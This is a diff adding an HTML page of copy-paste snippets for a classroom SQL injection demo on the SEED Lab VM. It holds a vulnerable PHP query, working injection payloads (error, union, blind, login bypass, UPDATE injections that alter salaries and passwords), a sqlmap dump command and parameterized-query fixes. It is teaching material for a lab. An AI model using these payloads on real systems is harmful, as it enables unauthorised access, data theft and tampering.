@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Demo Code Snippets for SEED Lab VM</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1, h2 { color: #333; }
+        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ddd; overflow: auto; }
+        button { margin-top: 10px; }
+    </style>
+    <script>
+        function copyToClipboard(id) {
+            const text = document.getElementById(id).innerText;
+            navigator.clipboard.writeText(text).then(() => alert('Copied to clipboard!'));
+        }
+    </script>
+</head>
+<body>
+    <h1>SQL Injection Demo Code Snippets</h1>
+    <p>This simple page contains code snippets and payloads from your presentation for easy copy-paste into the SEED Lab VM. Use for live demos. Each section has a "Copy" button.</p>
+
+    <h2>1. Vulnerable Code Example (PHP from SEED Lab)</h2>
+    <pre id="vuln-code">$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password FROM credential WHERE name='$input_uname' and Password='$hashed_pwd';";</pre>
+    <button onclick="copyToClipboard('vuln-code')">Copy Vulnerable Code</button>
+
+    <h2>2. Malicious Payloads for In-band SQLi</h2>
+    <pre id="inband-error">nonexistent' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) = 1 -- </pre>
+    <button onclick="copyToClipboard('inband-error')">Copy Error-based Payload</button>
+
+    <pre id="inband-union">nonexistent' AND 1=0 UNION SELECT @@version COLLATE latin1_swedish_ci,2,3,4,5,6,7,8,9,10 -- </pre>
+    <button onclick="copyToClipboard('inband-union')">Copy Union-based Payload</button>
+
+    <pre id="inband-bypass">admin' # </pre>
+    <button onclick="copyToClipboard('inband-bypass')">Copy Login Bypass Payload</button>
+
+    <h2>3. Malicious Payloads for Blind SQLi</h2>
+    <pre id="blind-boolean">admin' AND SUBSTRING((SELECT Password FROM credential WHERE name='admin'),1,1)='a' -- </pre>
+    <button onclick="copyToClipboard('blind-boolean')">Copy Boolean-based Payload</button>
+
+    <pre id="blind-time">admin' AND IF(1=1, SLEEP(5), 0)=0 -- </pre>
+    <button onclick="copyToClipboard('blind-time')">Copy Time-based Payload</button>
+
+    <h2>4. UPDATE Injection Payloads (Edit Profile Nickname)</h2>
+    <pre id="update-own">Alice', salary=100000 WHERE name='Alice'; -- </pre>
+    <button onclick="copyToClipboard('update-own')">Copy Modify Own Data</button>
+
+    <pre id="update-other">Alice', salary=1 WHERE name='Boby'; -- </pre>
+    <button onclick="copyToClipboard('update-other')">Copy Modify Another's Data</button>
+
+    <pre id="update-pass">Alice', Password='2bdabfb2238f89a9a879687988d56a84ef59aad3' WHERE name='Boby'; -- </pre>
+    <button onclick="copyToClipboard('update-pass')">Copy Change Password</button>
+
+    <h2>5. Prevention: Parameterized Queries</h2>
+    <pre id="param-query">// Secure (parameterized)
+$stmt = $mysqli->prepare("SELECT * FROM credential WHERE name = ? AND Password = ?");
+$stmt->bind_param("ss", $input_uname, $hashed_pwd);  // "ss" = two strings
+$stmt->execute();</pre>
+    <button onclick="copyToClipboard('param-query')">Copy Parameterized Query</button>
+
+    <h2>6. Prevention: Stored Procedures</h2>
+    <pre id="stored-proc-sql">-- Create procedure in MySQL
+CREATE PROCEDURE LoginUser(IN uname VARCHAR(255), IN pwd VARCHAR(255))
+BEGIN
+    SELECT * FROM credential WHERE name = uname AND Password = pwd;
+END;</pre>
+    <button onclick="copyToClipboard('stored-proc-sql')">Copy Stored Procedure SQL</button>
+
+    <pre id="stored-proc-php">// PHP call
+$stmt = $mysqli->prepare("CALL LoginUser(?, ?)");
+$stmt->bind_param("ss", $input_uname, $hashed_pwd);
+$stmt->execute();</pre>
+    <button onclick="copyToClipboard('stored-proc-php')">Copy Stored Procedure PHP Call</button>
+
+    <h2>7. sqlmap Command for Testing</h2>
+    <pre id="sqlmap">sqlmap -u "http://www.SEEDLabSQLInjection.com/index.php" --data="username=admin&Password=123" --dump</pre>
+    <button onclick="copyToClipboard('sqlmap')">Copy sqlmap Command</button>
+
+</body>
+</html>
